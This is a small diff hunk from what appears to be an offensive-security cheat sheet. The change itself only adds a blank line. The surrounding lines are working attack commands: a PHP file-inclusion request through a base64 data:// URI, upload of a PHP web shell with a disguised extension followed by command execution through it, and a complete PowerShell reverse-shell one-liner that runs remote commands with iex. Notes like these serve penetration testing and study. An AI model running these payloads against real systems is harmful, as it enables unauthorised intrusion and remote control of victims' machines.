@@ -132,6 +132,7 @@ curl "http://example.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyB
 cp /usr/share/webshells/php/simple-backdoor.php ~/simple-backdoor.Php
 curl -i -F "fileToUpload=@./simple-backdoor.Php" http://target.com/meteor/upload.php
 curl -i http://target.com/meteor/uploads/simple-backdoor.Php?cmd=whoami
+
 # Prepare PS reverse shell
 pwsh
 $Shell = '$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
